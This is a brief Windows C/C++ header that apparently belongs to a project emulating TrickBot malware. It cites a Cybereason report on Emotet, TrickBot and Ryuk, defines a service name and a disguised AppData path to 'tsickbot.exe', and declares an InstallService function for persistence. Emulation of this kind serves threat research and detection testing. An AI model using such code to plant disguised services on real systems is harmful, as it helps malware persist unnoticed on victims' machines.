#pragma once
#include "Windows.h"

//https://www.cybereason.com/blog/triple-threat-emotet-deploys-trickbot-to-steal-data-spread-ryuk-ransomware
#define SERVICE_NAME L"Service-Techno3"
#define SERVICE_PATH L"C:\\Users\\vfleming\\AppData\\Roaming\\WNetval\\tsickbot.exe"


int InstallService();